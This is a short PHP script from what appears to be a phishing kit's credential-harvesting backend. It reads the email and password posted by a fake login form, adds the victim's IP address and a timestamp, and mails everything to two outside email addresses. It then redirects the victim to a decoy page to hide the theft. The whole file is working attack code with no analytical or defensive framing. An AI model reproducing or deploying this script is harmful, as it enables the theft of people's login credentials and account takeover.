<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");

/**
 * CH33Z3
 * @1999
 */
 	function redirect_to($url){
		echo '<script type="text/javascript">
		window.location = "'.$url.'"
		</script>';
		}
function send_email($from,$to,$subj,$msg){
				$header = "From: ".$from." \r\n";
				$header .= "Content-Type: text/html; charset=utf-8  \r\n";
				$retval = mail ($to,$subj,$msg,$header);
				   if( $retval == true ){
					 return true;
				   }else{
					 return false;
				   }
		}

 $body ="Hell0,


login       : $_POST[email]
password       : $_POST[password]

====================
IP : $ip 
DATE : $datamasii
";
$subj 		= "WETRF | ".$ip." | ".$_POST['email']."\n";
			$from		= 'info@cheeze.com';
			$to="cheezebox@protonmail.com, cheezefactoryinc@gmail.com";
send_email($from,$to,$subj,nl2br($body));
redirect_to('backup.html');
/**
 * 	$error=$body;
 *  $handle=fopen('error.txt','w');
 *   fwrite($handle,$error .'\n');	
 */
 
?>